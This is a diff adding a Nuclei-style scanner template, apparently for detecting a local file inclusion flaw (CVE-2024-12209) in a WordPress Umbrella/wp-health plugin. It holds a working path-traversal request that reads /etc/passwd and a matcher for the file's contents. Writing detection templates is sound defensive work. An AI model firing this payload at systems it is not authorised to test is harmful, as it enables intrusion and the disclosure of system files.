@@ -1,0 +1,39 @@
+id: wp-plugin-umbrella-file-inclusion
+info:
+  name: WordPress Plugin Umbrella File Inclusion Vulnerability (CVE-2024-12209)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: lfi,CVE-2024-12209
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/wp-content/plugins/wp-health"
+  - method: GET
+    path:
+      - "{{BaseURL}}/?umbrella-restore=1&filename=../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0"
+      - type: word
+        part: body
+        words:
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "text/html"
